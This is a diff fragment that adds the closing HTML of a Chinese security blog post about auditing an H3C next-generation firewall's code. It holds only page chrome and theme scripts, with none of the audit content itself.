+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#php代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>H3C-下一代防火墙代码审计</div>
+      <div>https://nocpeople.github.io/2024/11/08/H3C/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>咩咩羊</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - MieMieYang">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/" title="Redis未授权">
+                        <span class="hidden-mobile">Redis未授权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <div class="footer_custom_text">不要被任何人左右你的情绪</div> <div> <span id="timeDate">载入天数...</span> <script src="/js/duration.js"></script> </div>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
